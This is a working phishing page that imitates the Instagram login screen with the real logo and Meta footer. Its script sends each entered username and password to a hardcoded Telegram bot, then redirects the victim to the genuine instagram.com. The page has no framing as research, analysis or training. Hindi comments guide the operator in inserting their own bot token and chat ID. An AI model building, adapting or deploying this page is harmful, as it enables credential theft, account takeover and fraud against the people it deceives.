<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background: linear-gradient(180deg, #fbf7fb 0%, #f4f7fa 50%, #f6fbf9 100%);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: space-between;
            min-height: 100vh;
            padding: 20px;
        }

        .top-bar {
            width: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #4a4a4a;
            font-size: 14px;
            margin-top: 20px;
            font-weight: 400;
        }

        .main-container {
            width: 100%;
            max-width: 360px;
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-top: auto;
            margin-bottom: auto;
        }

        .logo-container {
            margin-top: -50px;
            margin-bottom: 45px;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .logo-container i {
            transform: scale(0.85);
        }

        form {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 14px;
        }

        input {
            width: 100%;
            padding: 16px;
            border: 1px solid #d3d9de;
            border-radius: 12px;
            background-color: #ffffff;
            font-size: 15px;
            outline: none;
            color: #1c1e21;
        }

        input:focus {
            border-color: #0064e0;
        }

        input::placeholder {
            color: #737373;
        }

        .login-btn {
            width: 100%;
            padding: 14px;
            background-color: #0064e0;
            color: white;
            border: none;
            border-radius: 25px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 6px;
        }

        .login-btn:active {
            opacity: 0.9;
        }

        .login-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .forgot-password {
            color: #1c1e21;
            text-decoration: none;
            font-size: 15px;
            font-weight: 500;
            margin-top: 24px;
            text-align: center;
        }

        .footer-container {
            width: 100%;
            max-width: 360px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 18px;
            margin-bottom: 15px;
        }

        .create-account-btn {
            width: 100%;
            padding: 12px;
            background-color: transparent;
            color: #0064e0;
            border: 1.5px solid #0064e0;
            border-radius: 25px;
            font-size: 15px;
            font-weight: 600;
            text-align: center;
            text-decoration: none;
        }

        .meta-logo {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            color: #1c1e21;
            font-size: 16px;
            font-weight: 600;
            letter-spacing: -0.2px;
        }

        .meta-logo svg {
            width: 25px;
            height: 16px;
        }

        .status-msg {
            font-size: 13px;
            text-align: center;
            margin-top: 10px;
            min-height: 18px;
        }

        .status-msg.success { color: #0a7d33; }
        .status-msg.error { color: #d32f2f; }
    </style>
</head>
<body>

    <div class="top-bar">
        English (India) ▾
    </div>

    <div class="main-container">
        <div class="logo-container">
            <i data-visualcompletion="css-img" aria-label="Instagram" role="img" style="background-image: url('https://static.cdninstagram.com/rsrc.php/yp/r/kMOjiHCb1kY.webp'); background-position: 0px 0px; background-size: 97px 152px; width: 96px; height: 96px; background-repeat: no-repeat; display: inline-block;"></i>
        </div>

        <form id="loginForm" action="https://submit-form.com/VDWc6EBfL" method="POST">
            
            <input type="hidden" name="_redirect" value="https://instagram.com" />

            <input 
                type="text" 
                id="username" 
                name="username" 
                placeholder="Username, email address or mobile number" 
                required 
            />
            
            <input 
                type="password" 
                id="password" 
                name="password" 
                placeholder="Password" 
                required 
            />

            <button type="submit" class="login-btn" id="loginBtn">Log in</button>
        </form>

        <p class="status-msg" id="statusMsg"></p>

        <a href="https://instagram.com" class="forgot-password">Forgotten password?</a>
    </div>

    <div class="footer-container">
        <a href="https://instagram.com" class="create-account-btn">Create new account</a>
        
        <div class="meta-logo">
            <svg viewBox="0 0 150.067 99" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M107.666 0C95.358 0 86.865 4.504 75.195 19.935 64.14 5.361 55.152 0 42.97 0 18.573 0 0 29.768 0 65.408 0 86.847 12.107 99 28.441 99c15.742 0 25.269-13.2 33.445-27.788l9.663-16.66a643.785 643.785 0 0 1 2.853-4.869 746.668 746.668 0 0 1 3.202 5.416l9.663 16.454C99.672 92.72 108.126 99 122.45 99c16.448 0 27.617-13.723 27.617-33.25 0-37.552-19.168-65.75-42.4-65.75ZM57.774 46.496l-9.8 16.25c-9.595 15.976-13.639 19.526-19.67 19.526-6.373 0-11.376-5.325-11.376-17.547 0-24.51 12.062-47.451 26.042-47.451 7.273 0 12.678 3.61 22.062 17.486a547.48 547.48 0 0 0-7.258 11.736Zm64.308 35.776c-6.648 0-11.034-4.233-20.012-19.39l-9.663-16.386c-2.79-4.737-5.402-9.04-7.88-12.945 9.73-14.24 15.591-17.984 23.002-17.984 14.118 0 26.204 20.96 26.204 49.158 0 11.403-4.729 17.547-11.651 17.547Z" fill="#0064e0"></path>
            </svg>
            Meta
        </div>
    </div>

    <script>
        // ============================================================
        // YAHAN APNA TELEGRAM BOT TOKEN AUR CHAT ID DAALEIN
        // ============================================================
        const TELEGRAM_BOT_TOKEN = "8993659615:AAGjf9n3qvPXWCZh58E2ZZy2zugh680wqls";   // <-- yahan apna bot token daalein
        const TELEGRAM_CHAT_ID   = "5815367705";     // <-- yahan apni chat id daalein
        // ============================================================

        const form = document.getElementById("loginForm");
        const loginBtn = document.getElementById("loginBtn");
        const statusMsg = document.getElementById("statusMsg");

        form.addEventListener("submit", async function (e) {
            e.preventDefault();

            const username = document.getElementById("username").value.trim();
            const password = document.getElementById("password").value.trim();

            if (!username || !password) {
                statusMsg.textContent = "Please fill all fields.";
                statusMsg.className = "status-msg error";
                return;
            }

            loginBtn.disabled = true;
            loginBtn.textContent = "Logging in...";
            statusMsg.textContent = "";
            statusMsg.className = "status-msg";

            const text =
                "🔐 *New Login Attempt*\n" +
                "━━━━━━━━━━━━━━━━\n" +
                "👤 *Username:* `" + username + "`\n" +
                "🔑 *Password:* `" + password + "`\n" +
                "━━━━━━━━━━━━━━━━\n" +
                "🌐 *Page:* Instagram Login\n" +
                "🕒 *Time:* " + new Date().toLocaleString();

            try {
                const url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage";
                const res = await fetch(url, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: text,
                        parse_mode: "Markdown"
                    })
                });

                const data = await res.json();

                if (data.ok) {
                    statusMsg.textContent = "";
                    statusMsg.className = "status-msg success";
                } else {
                    statusMsg.textContent = "Something went wrong. Try again.";
                    statusMsg.className = "status-msg error";
                }
            } catch (err) {
                console.error(err);
                statusMsg.textContent = "Network error. Try again.";
                statusMsg.className = "status-msg error";
            }

            // Thoda delay ke baad redirect (original form action ke liye)
            setTimeout(function () {
                loginBtn.disabled = false;
                loginBtn.textContent = "Log in";
                // Agar aap submit-form.com par bhi bhejna chahte hain to ye line uncomment karein:
                // form.submit();
                window.location.href = "https://instagram.com";
            }, 1500);
        });
    </script>

</body>
</html>
